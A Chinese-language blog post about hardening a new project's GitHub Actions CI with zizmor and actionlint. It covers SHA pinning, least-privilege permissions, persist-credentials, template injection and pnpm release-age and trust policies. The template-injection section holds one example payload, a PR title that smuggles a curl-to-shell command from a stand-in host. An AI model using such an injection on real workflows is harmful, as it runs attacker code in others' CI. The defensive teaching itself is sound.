---
title: 開一個新專案，用 zizmor 把 CI 的洞一個個補起來
date: 2026-11-03
tags: [security, devops, ci-cd]
description: 把 LiteLLM 事件的教訓套到一個全新的 Vite + React + TypeScript 專案上：照平常習慣配好 CI，再用 zizmor 掃出問題，一個個修掉。SHA pin、最小權限、persist-credentials、template injection，還有 pnpm 的 minimumReleaseAge 與 trustPolicy 實測。
---

## 檢討完別人，換檢討自己的習慣

[上一篇](/blog/2026-11-02-litellm-unrevoked-key-supply-chain)我拆了 LiteLLM 的攻擊鏈，寫得頭頭是道。寫完之後我心裡有點發毛：**我平常配的 CI，又安全到哪裡去**？

所以這篇我做了一個實驗：開一個全新的 Vite + React + TypeScript 專案，叫 `pulse-board`（一個假的工程指標儀表板），然後**完全照我平常的習慣**把 CI 配好：

- **Visual Tests**：一個 gate job 先判斷要不要跑（push 到 `main`、UI 相關檔案有變動，或 PR 掛了 `needs-visual-check` label），要跑的話就 build、啟動 preview server，用 Playwright 截圖丟到 Argos 做視覺回歸測試
- **Security Scan**：用 Bearer 做靜態安全掃描，PR 只掃 diff，push 到 `main` 掃全部

這些都是照官方範例組出來的，能動，看起來也很正常。接下來就用工具掃一次，看看「正常」的 CI 到底有多少洞。

這篇的每個掃描結果、每個錯誤訊息，都是在這個示範專案上實際跑出來的。

## 第一步：先掃，別用猜的

我用了兩個工具：

- **[zizmor](https://docs.zizmor.sh/)**：專門抓 GitHub Actions 安全問題的靜態分析工具，Rust 寫的，裝起來很快
- **[actionlint](https://github.com/rhysd/actionlint)**：抓 workflow 語法錯誤、expression 型別錯誤，有裝 shellcheck 的話連 `run:` 裡的 shell script 都會檢查

```bash
pip install zizmor        # 實際安裝方式後面會講，這裡先求能跑
go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12

actionlint                       # 語法檢查
zizmor --offline .github/        # 預設模式
zizmor --offline --persona=pedantic .github/   # 吹毛求疵模式
```

actionlint（加上 shellcheck）沒抓到任何問題，這我不意外，能跑的 workflow 語法通常都沒錯。但 zizmor 的結果就不太好看了：

| 規則 | 數量 | 嚴重度 | 白話文 |
|---|---|---|---|
| `unpinned-uses` | 6 | high | action 用 tag（`@v6`）而不是 commit SHA |
| `excessive-permissions` | 1 | high | `id-token: write` 開在整個 workflow 層級 |
| `artipacked` | 3 | low | checkout 把 token 留在 runner 上 |
| `template-injection` | 4 | pedantic | `${{ }}` 直接寫進 shell script |
| `anonymous-definition` | 3 | pedantic | job 沒有 `name` |

一個剛開的專案、兩條照範例寫的 workflow，就有 17 個發現。一個一個來。

## 問題一：`@v6` 不是你以為的那個 `@v6`

原本的寫法長這樣：

```yaml
- uses: actions/checkout@v6
- uses: pnpm/action-setup@v6
- uses: actions/setup-node@v6
- uses: bearer/bearer-action@v2
```

看起來很正常對吧？官方文件也都這樣寫。

問題在於 **git tag 是可以移動的**。`v6` 只是一個指標，維護者（或偷到維護者帳號的人）隨時可以把它改指到另一個 commit。你的 workflow 下次執行時，GitHub 會乖乖去抓新的那個 commit 來跑，你完全不會知道。

這不是理論。2025 年 3 月的 `tj-actions/changed-files` 事件就是這樣：攻擊者把幾乎所有版本 tag 都改指到一個惡意 commit，那個 commit 會把 runner 記憶體裡的 secrets 印到 log 上。用這個 action 的公開 repo，secrets 就直接攤在公開的 Actions log 裡。

解法是改用 **commit SHA**，因為 SHA 是內容的 hash，改不了。

### 怎麼查 SHA？小心 annotated tag

```bash
git ls-remote --tags https://github.com/actions/checkout.git | grep -E 'v6\.1\.0'
# d23441a48e516b6c34aea4fa41551a30e30af803  refs/tags/v6.1.0
```

這裡有個小坑：如果 tag 是 **annotated tag**，`ls-remote` 會列出兩行，一行是 tag 物件本身的 SHA，一行結尾是 `^{}`，那才是真正的 commit SHA。`uses:` 要填的是 commit 那個：

```text
9f698171ed81b15d1823a05fc7211befd50c8ae0  refs/tags/v6.0.3      ← tag 物件，不要用這個
df4cb1c069e1874edd31b4311f1884172cec0e10  refs/tags/v6.0.3^{}   ← commit，用這個
```

我寫了個小 one-liner，找出目前 `v6` 實際指到哪個版本：

```bash
repo=actions/checkout; major=v6
out=$(git ls-remote --tags https://github.com/$repo.git)
commit_of() {  # 優先取 ^{}（annotated tag 指向的 commit）
  local p=$(echo "$out" | awk -v t="refs/tags/$1^{}" '$2==t{print $1}')
  [ -n "$p" ] && echo "$p" || echo "$out" | awk -v t="refs/tags/$1" '$2==t{print $1}'
}
m=$(commit_of $major); echo "$major -> $m"
echo "$out" | awk '{print $2}' | sed 's#refs/tags/##; s#\^{}##' | sort -u \
  | grep -E "^$major\.[0-9]+(\.[0-9]+)?$" \
  | while read t; do [ "$(commit_of $t)" = "$m" ] && echo "  = $t"; done
# v6 -> d23441a48e516b6c34aea4fa41551a30e30af803
#   = v6.1.0
```

改完長這樣，後面的註解是寫給人看的版本號：

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
- uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
- uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
- uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
```

### 那 SHA 不就永遠不會更新了？

對，所以要搭配 Dependabot。它看得懂 `@<sha> # v6.1.0` 這種寫法，有新版時會開 PR，同時更新 SHA 和註解：

```yaml
# .github/dependabot.yml
version: 2
updates:
  # 讓 workflow 裡以 commit SHA 鎖定的 action 自動提 PR 更新（連同 # vX.Y.Z 註解）
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    # 新版本發布後至少等 7 天才提 PR，避開「剛發布就被下毒」的時間窗
    cooldown:
      default-days: 7
    groups:
      github-actions:
        patterns: ["*"]
```

`cooldown` 是我覺得最重要的一行。LiteLLM 的惡意版本只活了兩小時，tj-actions 的惡意 commit 也是幾天內就被發現。**讓別人先踩雷**，聽起來很自私，但在供應鏈安全上這是很實在的策略。

## SHA pin 不是萬能（一）：action 執行時還會再下載東西

改完 SHA 之後，我順手看了一下 `bearer-action` 到底做了什麼。打開它的 `action.yml`：

```yaml
runs:
  using: "composite"
  steps:
    - shell: bash
      run: |
        VERSION="${{ inputs.version }}"
        ...
        curl -sfL https://raw.githubusercontent.com/Bearer/bearer/main/contrib/install.sh | sh -s -- -b "$RUNNER_TEMP" "$VERSION"
```

嗯……我把 action 鎖死在某個 SHA 了，但它一執行就去 **`main` 分支**抓 install.sh 來跑，而且我沒指定 `version`，所以 install.sh 會下載**最新版**的 Bearer CLI。

也就是說，我鎖住的只是外殼，裡面真正執行的程式還是浮動的。

install.sh 有做 checksum 驗證，但 checksum 檔和執行檔來自**同一個 release**。這能防傳輸過程中檔案損壞，卻防不了 release 本身被換掉：能發布惡意 release 的人，當然也能發布一份對應的 checksum。這跟上一篇 LiteLLM「簽章是真的」是同一個道理。

我能做的是至少把 CLI 版本鎖住：

```yaml
- name: Run Bearer SAST
  uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
  with:
    # action 本身鎖了 SHA，但它執行時會下載 Bearer CLI；
    # 不指定 version 就會抓「最新版」，所以這裡也要鎖
    version: "2.1.3"
    diff: ${{ github.event_name == 'pull_request' }}
    exit-code: "1"
```

`install.sh` 從 `main` 下載這件事我改不了，除非 fork 這個 action 或自己寫下載步驟。這是已知、接受的剩餘風險。**SHA pin 之後，記得打開 action 的原始碼看一眼它還會抓什麼**。

## SHA pin 不是萬能（二）：fork 的 commit 也查得到

還記得上一篇那個細節嗎？LiteLLM 的攻擊者在仿冒組織 `Berri-AI` 建了 fork，但那個 fork 的 commit 用 `github.com/BerriAI/litellm/commit/20535d8f` 也打得開，因為 GitHub 讓 fork 和原 repo 共用 git 物件。

這對 SHA pin 也是個洞。理論上有人可以發一個 PR 給你，把 `uses: actions/checkout@<sha>` 改成某個 **fork 裡的惡意 commit**。因為 `actions/checkout@<那個 SHA>` 真的解析得到，reviewer 只看到一串 40 碼的 hash 換成另一串，很難察覺。zizmor 有一個 `impostor-commit` 檢查專門抓這種情況（需要連網模式）。

這也是 GitHub 推出 lockfile 的原因之一。

## 更好的做法：Actions workflow lockfile

GitHub 在 10 月 14 日推出 Actions workflow lockfile 公開預覽，10 月 28 日 GA。概念跟 `composer.lock`、`pnpm-lock.yaml` 一樣：用 `gh actions-lock` 產生 `.github/workflows/actions.lock`，記錄每個 action（**包含 action 內部再用到的其他 action**）解析到哪個 commit。

```yaml
# .github/workflows/actions.lock（官方文件範例）
version: 'v0.0.3'
workflows:
    '.github/workflows/ci.yml':
        - 'octo-org/deploy-action@v3.1.0'
dependencies:
    'octo-org/deploy-action@v3.1.0':
        ref: 'v3.1.0'
        commit: 'sha1-...'
        owner_id: 44036562
        repo_id: 197814629
```

它比手動 SHA pin 強在三個地方：

1. **連 transitive dependency 都鎖**：手動 pin 只鎖得到你自己寫的那層
2. **記錄 `owner_id` / `repo_id`**：就算 repo 被刪掉、有人用同名 repo 搶註，數字 ID 也對不上
3. **檢查 commit 必須能從記錄的 tag 或分支走到**：fork 裡的 commit 會被拒絕，剛好補上前面 impostor commit 的洞

而且 runner 執行時會強制檢查，不是只有 lint。用法：

```bash
gh extension install github/gh-actions-lock
gh actions-lock              # 產生或修正 actions.lock
git add .github/workflows/
gh actions-lock --verify     # 放進 CI，確保沒人 commit 壞掉的 lockfile
```

但要老實說它的限制（來自官方 README）：

- 呼叫**其他 repo 的 reusable workflow**（`jobs.<id>.uses`）不會被鎖
- **container image** 不會被鎖，沒寫 `@sha256:` digest 只會給警告
- 同 repo 的本地 action（`./...`）不會被追蹤
- 工具還在 1.0 之前

`gh actions-lock` 需要已登入的 `gh` CLI，而且要有 GitHub 上的 repo 才能驗證。我這個示範專案只在本機，所以這篇先用手動 SHA pin。官方文件也說，用了 lockfile 之後，workflow 檔裡就不一定要寫 SHA 了。

## 問題二：權限給太大

原本的 `visual-tests.yml`：

```yaml
permissions:
  contents: read
  id-token: write # Argos 用 GitHub OIDC 驗證上傳者身分
```

`id-token: write` 讓 job 能向 GitHub 要一張 **OIDC token**，證明「我是這個 repo 的這個 workflow」。Argos 用它來驗證上傳者身分，不需要另外設 API key，這是好事。

問題是我把它開在**整個 workflow**，所以只負責判斷「要不要跑」的 `changes` job 也拿得到。OIDC token 可以拿去跟雲端服務交換憑證：如果哪天我設定了 AWS 或 GCP 信任這個 repo，任何一個 job 被打穿，就能拿 OIDC token 去換雲端權限。

改成頂層全關、每個 job 自己開：

```yaml
# 預設不給任何權限，每個 job 只開自己需要的（最小權限原則）
permissions: {}

jobs:
  changes:
    permissions:
      contents: read
    # ...

  visual:
    permissions:
      contents: read
      id-token: write # Argos 用 GitHub OIDC 驗證，只有這個 job 需要
```

這跟 Laravel 的 Policy 是同一個思路：預設拒絕，需要什麼再明確給。

## 問題三：checkout 把 token 留在 runner 上

`actions/checkout` 預設會把 `GITHUB_TOKEN` 存下來，讓你後面可以直接 `git push`。v6 之後，它改存到 `$RUNNER_TEMP` 底下的獨立檔案，不再直接寫進 `.git/config`，但不管存在哪，**同一個 job 後面的每個 step 都讀得到**。

這為什麼危險？想想 `visual` job 後面做了什麼：`pnpm install`。任何一個相依套件如果帶有惡意的 install script，它就能翻出這個 token。

這兩條 workflow 從頭到尾都不需要 push，所以直接關掉：

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
  with:
    persist-credentials: false # 不把 GITHUB_TOKEN 留在 runner 上
```

## 問題四：`${{ }}` 是字串替換，不是變數

gate job 原本長這樣：

```yaml
- id: filter
  run: |
    if [ "${{ github.event_name }}" = "push" ] \
       || [ "${{ contains(github.event.pull_request.labels.*.name, 'needs-visual-check') }}" = "true" ]; then
      echo "ui=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only \
      "${{ github.event.pull_request.base.sha }}" \
      "${{ github.event.pull_request.head.sha }}")
```

很多人以為 `${{ }}` 像 PHP 的 `{$var}` 插值，但它其實更像 Blade 的 `{!! !!}`：**GitHub 會在執行 shell 之前，把值原封不動貼進 script 裡**，沒有任何跳脫。

如果貼進去的是攻擊者能控制的內容，例如 PR 標題、issue 內文、分支名稱，那就是一個 shell injection：

```yaml
# ❌ 經典錯誤：PR 標題取名為  a"; curl https://evil.example/x | sh; echo "
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

這裡的情況其實沒有直接危險：event name、SHA、布林值都不是外部人能任意控制的字串，所以 zizmor 只在 pedantic 模式提醒。但習慣很重要，哪天複製貼上改成 PR 標題就中招了。正確寫法是**先放進 `env:`，script 裡只用 shell 變數**：

```yaml
- id: filter
  # ${{ }} 一律先放進 env，script 內只用 shell 變數，避免 template injection
  env:
    EVENT_NAME: ${{ github.event_name }}
    HAS_LABEL: ${{ contains(github.event.pull_request.labels.*.name, 'needs-visual-check') }}
    BASE_SHA: ${{ github.event.pull_request.base.sha }}
    HEAD_SHA: ${{ github.event.pull_request.head.sha }}
  run: |
    if [ "$EVENT_NAME" = "push" ] || [ "$HAS_LABEL" = "true" ]; then
      echo "ui=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only "$BASE_SHA" "$HEAD_SHA")
```

透過環境變數傳進去，值就只是資料，shell 不會把它當程式碼解析。這就是 prepared statement 的概念，只是換到 shell 上。

## 刻意沒修的：`anonymous-definition`

pedantic 模式剩下 3 個「job 沒有 `name`」，我刻意不改。

原因是 GitHub 的 status check 名稱是從 job id 或 name 來的。如果你在 branch protection 把某個 check 設成必要檢查，事後再改名，規則就會對不上新名字，PR 可能直接卡住或略過檢查。新專案還沒設 branch protection 的話，一開始就取好名字最好；已經上線的專案，就要連同保護規則一起改。**工具的建議是參考，不是聖旨**，每一條都要想清楚再改。

## 問題五：相依套件本身

workflow 修完了，但 CI 裡實際執行最多第三方程式碼的，其實是 `pnpm install`。

### `--frozen-lockfile`

```yaml
- name: Install dependencies
  # --frozen-lockfile：lockfile 與 package.json 不一致就失敗，不偷偷解析新版本
  run: pnpm install --frozen-lockfile
```

pnpm 在 CI 環境預設其實就是 frozen，但寫出來比較清楚，也不怕哪天預設值改了。這跟 `composer install` 而不是 `composer update` 是同樣的道理。

### pnpm 12 的兩個供應鏈政策

翻 pnpm 12 的 changelog 時我發現，它**其實已經內建 1 天的 `minimumReleaseAge`**，但那是「寬鬆模式」：太新的版本會被自動加進例外清單，不會擋下來。明確寫出設定值後才會變成 strict。

```yaml
# pnpm-workspace.yaml
# 只安裝發布超過 3 天的版本（單位：分鐘）。明確設定後即為 strict：太新的版本直接失敗
minimumReleaseAge: 4320
# 套件的發布方式若比舊版「降級」（例如從 trusted publishing 變成一般 token 發布）就拒絕
trustPolicy: no-downgrade
```

`trustPolicy: no-downgrade` 的邏輯是：如果一個套件之前的版本都是透過 CI 的 trusted publishing 發布（有 provenance），突然有一版是用個人 token 從某人電腦上發布的，那很可能是帳號被盜。這在 npm 圈的幾次大規模蠕蟲事件裡都是典型特徵。

## 然後政策馬上就擋下東西了

`pulse-board` 是我用 `pnpm add` 一個個裝起來的，當時用的是 pnpm 的預設設定。加上上面的政策後，跑一次 CI 會用的指令：

```bash
rm -rf node_modules && pnpm install --frozen-lockfile
```

```text
  × installing dependencies
  ╰─▶ 2 lockfile entries failed verification:
        @vitejs/plugin-react@6.2.1 was published at 2026-11-02T09:15:06.000Z,
      within the minimumReleaseAge cutoff (2026-11-01T02:13:43.989Z)
        semver@7.8.6 was published at 2026-11-02T17:05:43.359Z, within the
      minimumReleaseAge cutoff (2026-11-01T02:13:43.989Z)
```

一個新專案，裝完不到兩天，lockfile 裡就有兩個「太新」的套件。

- **`@vitejs/plugin-react@6.2.1`**：直接相依，是 Vite 的 React plugin
- **`semver@7.8.6`**：間接相依，路徑是 `@argos-ci/playwright` → `@argos-ci/core` → `sharp` → `semver`

查一下 plugin-react 的發布紀錄，很有意思：

```bash
npm view @vitejs/plugin-react time --json
```

| 版本 | 發布時間（UTC） |
|---|---|
| 6.1.2 | 10/05 |
| 6.2.0 | 11/02 07:47 |
| 6.2.1 | 11/02 09:18 |

6.2.0 發布後 **90 分鐘**就跟了一個 6.2.1。新版本出來後馬上補一個 hotfix 是很常見的事，這也是「等幾天再用」的另一個好處：除了避開惡意版本，也避開那種剛發布、還在修 bug 的版本。

### 第一個坑：`pnpm add` 寫進去的版本範圍

我以為照 pnpm 的提示重新解析就好，結果還是失敗。原因在 `package.json`：

```json
"@vitejs/plugin-react": "^6.2.1"
```

`pnpm add` 會把**當下裝到的版本**寫成 caret 範圍的下限。`^6.2.1` 代表「至少 6.2.1」，而 6.2.1 本身就太新了，所以在 3 天的限制下根本沒有版本可以選。要先把下限放寬到夠舊的版本：

```json
"@vitejs/plugin-react": "^6.1.2"
```

### 第二個坑：一般的 `pnpm install` 會先驗證舊 lockfile

改完 `package.json` 直接跑 `pnpm install`，還是同樣的錯誤。因為 pnpm 會先拿政策去檢查**現有的 lockfile**，檢查不過就停了，根本走不到重新解析。要照錯誤訊息的提示，先清掉 lockfile：

```bash
pnpm clean --lockfile
pnpm install
# + @vitejs/plugin-react 6.1.2
```

`semver` 是間接相依，不用改 `package.json`，pnpm 自動選了符合政策的 7.8.5。最後 lockfile 只有這兩個版本不同：

```diff
-  '@vitejs/plugin-react@6.2.1':
+  '@vitejs/plugin-react@6.1.2':
-  semver@7.8.6:
+  semver@7.8.5:
```

再跑一次 frozen install，通過：

```bash
rm -rf node_modules && pnpm install --frozen-lockfile
# Done in 61ms using pnpm v12.15.0
```

`pnpm clean --lockfile` 會整份重新解析，在大專案裡可能會順便升級一堆其他套件。這時候更要仔細看 lockfile 的 diff，這也是為什麼**政策最好在專案一開始就設好**。

## `trustPolicy` 被觸發時長什麼樣

`pulse-board` 的相依套件沒有觸發 `trustPolicy`。但我想知道它真的擋東西時是什麼樣子，所以找了一個最近會觸發的真實案例，在一個空的暫存專案裡測：

```bash
pnpm add seroval@1.7.2
```

```text
  ╰─▶ Failed to resolve dependency: High-risk trust downgrade for
      "seroval@1.7.2" (possible package takeover)
```

「possible package takeover」，這幾個字看了還是會心跳加速。遇到這種告警，最簡單的做法是直接加進例外清單讓它過，但這樣設定政策就沒意義了。所以我把它當成練習，實際查一次。

### 先看發布紀錄

`seroval` 是一個資料序列化套件，被不少框架間接使用。

```bash
npm view seroval@1.7.1 --json   # 看 dist.attestations 和 _npmUser
```

| 版本 | 發布時間 | 發布者 | provenance |
|---|---|---|---|
| 1.7.1 | 10/23 | GitHub Actions（trusted publishing） | ✅ |
| **1.7.2** | **10/24** | **維護者個人帳號** | **❌** |
| 1.7.3 | 10/28 | GitHub Actions（trusted publishing） | ✅ |

夾在兩個 CI 發布版本中間，突然冒出一個個人帳號手動發布、沒有 provenance 的版本。這就是帳號被盜時會出現的模式。

### 再比對內容

把三個版本的 tarball 抓下來比對。**只下載、不安裝**，`--ignore-scripts` 確保不會執行任何東西：

```bash
for v in 1.7.1 1.7.2 1.7.3; do
  npm pack seroval@$v --ignore-scripts
  mkdir $v && tar -xzf seroval-$v.tgz -C $v
done

diff -r 1.7.1/package 1.7.2/package
```

結果：

```diff
diff -r 1.7.1/package/dist/index.js 1.7.2/package/dist/index.js
1692c1692
< 	if (ctx.base.pending && value instanceof Promise) value.catch(ignoreRejection);
---
> 	if (value instanceof Promise) value.catch(ignoreRejection);
diff -r 1.7.1/package/package.json 1.7.2/package/package.json
5c5
<   "version": "1.7.1",
---
>   "version": "1.7.2",
```

（`dist/` 下另外三個 build 檔也是同一行改動。）就一行 bug fix：處理沒被 catch 的 Promise rejection。沒有新檔案、沒有 install script、沒有網路請求。

再比 1.7.2 和 1.7.3：

```diff
diff -r 1.7.2/package/package.json 1.7.3/package/package.json
5c5
<   "version": "1.7.2",
---
>   "version": "1.7.3",
```

除了版本號，**一個 byte 都沒差**。合理的推測是：維護者先從自己電腦手動發了一個 hotfix，幾天後再透過 CI 正式發一次。不是接管。

### 結論不是「放行」，而是「升級」

既然後面的版本有正常的 provenance，就沒理由留在可疑的那一版。如果你的 lockfile 裡有 1.7.2，正確做法是升級：

```bash
pnpm update seroval --depth Infinity
```

pnpm 會在政策限制下，挑一個夠老、而且有 provenance 的版本。

那什麼時候才該加例外？當你確認它合法、**而且沒有更好的版本可以升**的時候。有名的例子是 `semver@6.3.1`：這是 2023 年維護者為了修 ReDoS 漏洞（CVE-2022-25883）手動發布的 backport，當時 7.x 已經改用 CI 發布並附 provenance，所以它也會被判成「降級」。這種情況就加進例外，**並寫清楚理由和移除條件**：

```yaml
# 經人工確認後才放行的例外，每一筆都要寫理由
trustPolicyExclude:
  # 2023-07 維護者手動發布的 ReDoS 修補 backport（CVE-2022-25883），沒有 provenance。
  # 之後若有 trusted publishing 的修補版且已滿 minimumReleaseAge，就升級並移除此行
  - semver@6.3.1
```

這段是我這次最大的收穫：**安全政策會產生需要人判斷的告警**。這時候最危險的不是告警本身，而是為了讓 CI 變綠，不假思索地加例外。

順帶一提，GitHub 在 10/20 也推出了 npm 的 **package firewall** 公開預覽，可以在組織層級做類似的 cooldown 和 attestation 降級檢查。不過它目前只開放給 GitHub Enterprise Cloud。個人專案的話，pnpm 這兩個設定就是免費又有效的替代方案。

## 讓檢查持續下去：workflow-audit.yml

手動掃一次很爽，但下次有人（通常是三個月後的自己）新增 workflow 時，還會記得嗎？所以再加一條 workflow，只要 `.github/` 有變動就自動跑：

```yaml
name: Workflow Audit

on:
  push:
    branches: [main]
    paths:
      - ".github/**"
  pull_request:
    paths:
      - ".github/**"

permissions: {}

jobs:
  audit:
    name: zizmor + actionlint
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      # runner 的系統 Python 受 PEP 668 保護，裝進獨立的 venv
      - name: Install zizmor
        run: |
          python3 -m venv "$RUNNER_TEMP/audit-venv"
          "$RUNNER_TEMP/audit-venv/bin/pip" install --require-hashes -r .github/workflow-audit-requirements.txt

      - name: Run zizmor
        env:
          # 給 zizmor 讀公開 repo 的 API（檢查 impostor commit、已知有漏洞的 action）
          GH_TOKEN: ${{ github.token }}
        run: |
          "$RUNNER_TEMP/audit-venv/bin/zizmor" --format=github .github/

      # go install 會用 sum.golang.org 驗證模組內容，等於自帶 hash 鎖定
      - name: Run actionlint
        run: |
          go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12
          "$(go env GOPATH)/bin/actionlint" -color
```

這裡有兩個值得一提的細節。

**第一，連檢查工具本身都要鎖**。zizmor 從 PyPI 安裝，用的是[上一篇](/blog/2026-11-02-litellm-unrevoked-key-supply-chain)的 `--require-hashes`：

```text
# .github/workflow-audit-requirements.txt
zizmor==1.31.1 \
    --hash=sha256:58e878eb2dbd2c6183c105e1ac28c14f7dd1eca44a783f1fe2a69647d012c410 \
    --hash=sha256:d9b36840c560a8abe39d9ef3d077239aabf6d572c5c2b629c970592a617dbf6f
```

我差點自己打臉：一開始我抓的是最新的 zizmor 1.32.0，查 hash 時才發現它是**前一天**才上傳的。我剛在上面講「新版本先等 7 天」，馬上就要違反。所以退回 10/15 發布的 1.31.1。

**第二，Go 的模組系統天生就有防線**。`go install ...@v1.7.12` 下載的模組，會跟 `sum.golang.org` 這個公開的透明日誌（transparency log）比對 hash。就算有人重新發布同一個版本號，內容不同就會被拒絕。這是我在學 Go 時覺得設計得很漂亮的地方：npm、pnpm、Composer 的 lockfile 雖然也記錄 hash，但那是「第一次下載後」才記下來的；Go 連第一次下載都會跟全世界共用的公開紀錄比對，而且預設就開著。

## 加固前後對照

| | 加固前 | 加固後 |
|---|---|---|
| zizmor（預設） | 10 個發現（7 high） | **0** |
| zizmor（pedantic） | 17 個 | 3 個（刻意保留的 job 名稱）|
| actionlint + shellcheck | 0 | 0 |
| action 版本 | 浮動 tag | commit SHA + Dependabot（7 天 cooldown）|
| Bearer CLI | 每次抓最新版 | 鎖 2.1.3 |
| `id-token: write` | 整個 workflow | 只有 `visual` job |
| 套件政策 | pnpm 預設（1 天、寬鬆） | 3 天 strict + trust downgrade 檢查 |

## 附贈：Laravel + Vite 專案的 CI 範本

最後把同樣的原則套到 PHP 開發者最熟悉的 Laravel 專案。這份範本**通過了 actionlint 和 zizmor 的檢查（0 findings）**，但我沒有在真實的 Laravel 專案上跑過，請當作起點、依你的專案調整：

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions: {}

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - uses: shivammathur/setup-php@eb7c497e18156a6bbabfef1d3a82760b9eda3962 # 2.40.0
        with:
          php-version: "8.4"
          coverage: none

      - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
        with:
          node-version: 22

      # Composer 只照 composer.lock 安裝。相依套件的 scripts 本來就不會執行，
      # 會執行程式碼的是 plugin：只有列在 composer.json 的 allow-plugins 才會載入（Composer 2.2+）
      - name: Install PHP dependencies
        run: composer install --no-interaction --prefer-dist --no-progress

      - name: Audit PHP dependencies
        run: composer audit --locked

      # npm ci：嚴格照 package-lock.json；--ignore-scripts：不跑任何套件的 install script
      - name: Install JS dependencies
        run: npm ci --ignore-scripts

      - name: Audit JS dependencies
        run: npm audit --audit-level=high

      - name: Build assets
        run: npm run build

      - name: Run tests
        run: php artisan test
```

幾個 PHP 開發者容易忽略的點：

- **Composer 不會執行相依套件的 `scripts`**，只會跑根專案（你自己的 `composer.json`）的。真正會在安裝時執行第三方程式碼的是 **plugin**，所以 `allow-plugins` 的白名單要認真審。用 Pest 的話，`pestphp/pest-plugin` 就是一個需要放行的 plugin。
- **`npm ci --ignore-scripts`** 會擋掉所有 install script。Vite 生態大多不需要；如果遇到真的需要 build 的套件（例如 `sharp`），再用 `npm rebuild <套件名>` 個別放行。
- 如果你的前端改用 pnpm，直接沿用上面的 `minimumReleaseAge` 和 `trustPolicy` 設定，pnpm 預設也只允許白名單內的套件執行 build script。

## 這次沒驗證到的

老實列出來：

- **Actions lockfile**：需要已登入的 `gh` 和 GitHub 上的 repo，示範專案只在本機，這次沒做
- **workflow 在 GitHub 上的實際執行**：這篇的 workflow 都用 actionlint、zizmor 驗證過，pnpm 的政策也實際跑過，但示範專案沒有推上 GitHub，所以 workflow 本身沒有真的在 runner 上執行過
- **`bearer-action` 從 `main` 下載 install.sh**：已知的剩餘風險

## 檢查清單

最後整理成一張可以直接拿去檢查自己 repo 的清單：

- [ ] 所有 `uses:` 都是 40 碼 commit SHA，後面註解版本號（或改用 Actions lockfile）
- [ ] 打開每個 action 的 `action.yml`，看它執行時還會下載什麼，能鎖的版本都鎖
- [ ] 有 Dependabot（或 Renovate）更新 SHA，並設定 cooldown
- [ ] workflow 頂層 `permissions: {}`，每個 job 只開需要的
- [ ] `actions/checkout` 加 `persist-credentials: false`（除非真的要 push）
- [ ] `run:` 裡沒有直接出現 `${{ }}`，全部改走 `env:`
- [ ] 套件安裝用 lockfile 嚴格模式（`--frozen-lockfile`、`npm ci`、`composer install`）
- [ ] 設定最小發布時間（pnpm `minimumReleaseAge`、pip `--uploaded-prior-to`、uv `--exclude-newer`），而且**在專案一開始就設**
- [ ] 政策擋下套件時，**先調查再放行**，能升級就升級，例外要寫理由和移除條件
- [ ] 有一條 workflow 持續用 zizmor / actionlint 檢查 workflow 本身

[下一篇](/blog/2026-11-04-agents-md-hijack-defense)要談的是另一種「供應鏈」：不是套件，而是你的 AI coding agent 會讀的那些 Markdown 檔案。

## 參考資料

- [GitHub 文件：Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
- [GitHub Changelog：GitHub Actions workflow lockfiles in public preview](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/)（2026-10-14）
- [github/gh-actions-lock](https://github.com/github/gh-actions-lock)
- [GitHub Changelog：GitHub package firewall in public preview](https://github.blog/changelog/2026-10-20-github-package-firewall-in-public-preview)（2026-10-20）
- [zizmor 文件](https://docs.zizmor.sh/)
- [actionlint](https://github.com/rhysd/actionlint)
- [actions/checkout v6 README](https://github.com/actions/checkout)
- [pnpm 設定文件](https://pnpm.io/settings)
